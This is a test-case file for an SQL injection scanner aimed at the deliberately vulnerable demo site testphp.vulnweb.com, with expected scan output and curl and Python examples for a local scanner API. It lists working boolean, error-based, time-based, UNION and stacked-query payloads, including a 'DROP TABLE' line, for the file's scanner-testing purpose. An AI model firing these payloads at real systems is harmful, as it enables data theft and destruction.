/**
 * SQL Injection Scanner - Test Cases
 * 
 * These test cases demonstrate the scanner's detection capabilities
 * against SQL injection vulnerable parameters on testphp.vulnweb.com
 */

export const TEST_CASES = [
  // ============================================================
  // Boolean-Based SQL Injection Tests
  // ============================================================
  {
    id: "test_001",
    name: "Boolean-Based SQLi - Artist Parameter",
    description: "Test boolean-based blind SQL injection on artist parameter",
    targetUrl: "http://testphp.vulnweb.com/artists.php",
    parameter: "artist",
    baselinePayload: "1",
    trueConditionPayload: "1 AND 1=1",
    falseConditionPayload: "1 AND 1=2",
    expectedResult: {
      type: "sqli",
      severity: "critical",
      method: "boolean_based",
      confidence: 90,
    },
    notes: "Should show different number of artists between true and false conditions",
  },

  {
    id: "test_002",
    name: "Boolean-Based SQLi - Category Parameter",
    description: "Test boolean-based SQL injection on category (cat) parameter",
    targetUrl: "http://testphp.vulnweb.com/categories.php",
    parameter: "cat",
    baselinePayload: "1",
    trueConditionPayload: "1 AND 1=1",
    falseConditionPayload: "1 AND 1=2",
    expectedResult: {
      type: "sqli",
      severity: "critical",
      method: "boolean_based",
      confidence: 90,
    },
    notes: "Should show different categories based on condition",
  },

  // ============================================================
  // Error-Based SQL Injection Tests
  // ============================================================
  {
    id: "test_003",
    name: "Error-Based SQLi - Product ID",
    description: "Test error-based SQL injection on product ID parameter",
    targetUrl: "http://testphp.vulnweb.com/product.php",
    parameter: "id",
    errorPayloads: [
      "1'",
      "1\"",
      "1' OR '1'='1",
      "1 AND extractvalue(0,concat(0x7e,(SELECT database())))",
    ],
    expectedResult: {
      type: "sqli",
      severity: "critical",
      method: "error_based",
      confidence: 95,
    },
    notes: "Should trigger SQL syntax errors in response",
  },

  // ============================================================
  // Time-Based Blind SQL Injection Tests
  // ============================================================
  {
    id: "test_004",
    name: "Time-Based SQLi - Search Parameter",
    description: "Test time-based blind SQL injection on search parameter",
    targetUrl: "http://testphp.vulnweb.com/search.php",
    parameter: "search",
    delayPayloads: [
      "test' AND SLEEP(2) AND '1'='1",
      "test' AND (SELECT * FROM (SELECT(SLEEP(2)))a) AND '1'='1",
    ],
    delaySeconds: [2, 5],
    expectedResult: {
      type: "sqli",
      severity: "critical",
      method: "time_based",
      confidence: 85,
    },
    notes: "Response time should increase by ~2-5 seconds with payload",
  },

  // ============================================================
  // Union-Based SQL Injection Tests
  // ============================================================
  {
    id: "test_005",
    name: "Union-Based SQLi - Artist Parameter",
    description: "Test union-based SQL injection for data extraction",
    targetUrl: "http://testphp.vulnweb.com/artists.php",
    parameter: "artist",
    unionPayloads: [
      "999 UNION SELECT 1,2,3,4,5,6,7,8,9,10",
      "999 UNION SELECT database(),user(),version(),4,5,6,7,8,9,10",
    ],
    expectedResult: {
      type: "sqli",
      severity: "critical",
      method: "union_based",
      confidence: 95,
    },
    notes: "Should extract database information or show injected values",
  },

  // ============================================================
  // Stacked Query Tests
  // ============================================================
  {
    id: "test_006",
    name: "Stacked Query SQLi",
    description: "Test stacked query injection (multiple statements)",
    targetUrl: "http://testphp.vulnweb.com/artists.php",
    parameter: "artist",
    stackedPayloads: [
      "1; DROP TABLE test; --",
      "1; SELECT * FROM information_schema.tables; --",
    ],
    expectedResult: {
      type: "sqli",
      severity: "critical",
      method: "stacked_query",
      confidence: 90,
    },
    notes: "Support depends on database backend permissions",
  },

  // ============================================================
  // Second-Order SQLi Tests
  // ============================================================
  {
    id: "test_007",
    name: "Second-Order SQLi",
    description: "Test second-order/stored SQL injection",
    targetUrl: "http://testphp.vulnweb.com/",
    storeUrl: "http://testphp.vulnweb.com/artists.php",
    storeParameter: "artist",
    storePayload: "1' UNION SELECT user() -- ",
    triggerUrl: "http://testphp.vulnweb.com/user_profile.php",
    expectedResult: {
      type: "sqli",
      severity: "critical",
      method: "second_order",
      confidence: 85,
    },
    notes: "Payload stored in database and executed in different context",
  },
];

export const EXPECTED_SCAN_OUTPUT = {
  scanId: 1,
  status: "completed",
  progress: 100,
  totalDuration: "~5-10 minutes",
  findings: [
    {
      id: 1,
      type: "sqli",
      severity: "critical",
      url: "http://testphp.vulnweb.com/artists.php",
      parameter: "artist",
      payload: "1' AND 1=1",
      verificationStatus: "confirmed",
      confidence: 95,
      detectionMethod: "Boolean-based blind SQL injection",
      evidence: "Response structure differs between true and false conditions",
    },
    {
      id: 2,
      type: "sqli",
      severity: "critical",
      url: "http://testphp.vulnweb.com/categories.php",
      parameter: "cat",
      payload: "1 UNION SELECT 1,2,3,4,5,6",
      verificationStatus: "confirmed",
      confidence: 95,
      detectionMethod: "Union-based SQL injection",
      evidence: "Injected values appear in response",
    },
    {
      id: 3,
      type: "sqli",
      severity: "critical",
      url: "http://testphp.vulnweb.com/product.php",
      parameter: "id",
      payload: "1' OR '1'='1",
      verificationStatus: "confirmed",
      confidence: 90,
      detectionMethod: "Error-based SQL injection",
      evidence: "SQL error message in response",
    },
  ],
  statistics: {
    totalRequests: 250,
    requestsPerSecond: 1.5,
    averageResponseTime: "~400ms",
    parametersScanned: 5,
    parametersVulnerable: 3,
    vulnerabilitiesConfirmed: 3,
    vulnerabilitiesPotential: 0,
  },
};

export const CURL_EXAMPLES = {
  createScan: `
    curl -X POST http://localhost:3000/api/scans \\
      -H "Content-Type: application/json" \\
      -d '{
        "targetUrl": "http://testphp.vulnweb.com/artists.php",
        "scanMode": "sqli",
        "threads": 10
      }'
  `,

  getScanStatus: `
    curl http://localhost:3000/api/scans/1
  `,

  getVulnerabilities: `
    curl http://localhost:3000/api/scans/1/vulnerabilities
  `,

  getLogs: `
    curl http://localhost:3000/api/scans/1/logs
  `,

  getTrafficLogs: `
    curl "http://localhost:3000/api/scans/1/traffic?limit=100"
  `,

  cancelScan: `
    curl -X POST http://localhost:3000/api/scans/1/cancel
  `,

  exportReport: `
    curl http://localhost:3000/api/scans/1/export > report.pdf
  `,
};

export const PYTHON_TEST_EXAMPLE = `
#!/usr/bin/env python3
import requests
import json
import time

BASE_URL = "http://localhost:3000"

def test_scanner():
    """Test the SQL injection scanner against testphp.vulnweb.com"""
    
    # Create a scan
    print("[*] Creating scan...")
    response = requests.post(f"{BASE_URL}/api/scans", json={
        "targetUrl": "http://testphp.vulnweb.com/artists.php",
        "scanMode": "sqli",
        "threads": 10
    })
    
    if response.status_code != 201:
        print(f"[!] Failed to create scan: {response.text}")
        return
    
    scan = response.json()
    scan_id = scan["id"]
    print(f"[+] Scan created with ID: {scan_id}")
    
    # Monitor scan progress
    print("[*] Monitoring scan progress...")
    while True:
        response = requests.get(f"{BASE_URL}/api/scans/{scan_id}")
        scan = response.json()
        
        status = scan["status"]
        progress = scan.get("progress", 0)
        
        print(f"[*] Status: {status}, Progress: {progress}%")
        
        if status in ["completed", "failed", "cancelled"]:
            break
        
        time.sleep(5)
    
    # Get vulnerabilities
    print("[*] Fetching vulnerabilities...")
    response = requests.get(f"{BASE_URL}/api/scans/{scan_id}/vulnerabilities")
    vulns = response.json()
    
    print(f"[+] Found {len(vulns)} vulnerabilities:")
    for vuln in vulns:
        print(f"  - {vuln['type']}: {vuln['parameter']} ({vuln['severity']})")
        print(f"    Confidence: {vuln['confidence']}%")
        print(f"    Payload: {vuln['payload']}")
    
    # Get scan statistics
    print("[*] Scan Summary:")
    print(f"  Duration: {scan.get('endTime')} - {scan.get('startTime')}")
    print(f"  Summary: {json.dumps(scan.get('summary', {}), indent=2)}")

if __name__ == "__main__":
    test_scanner()
`;
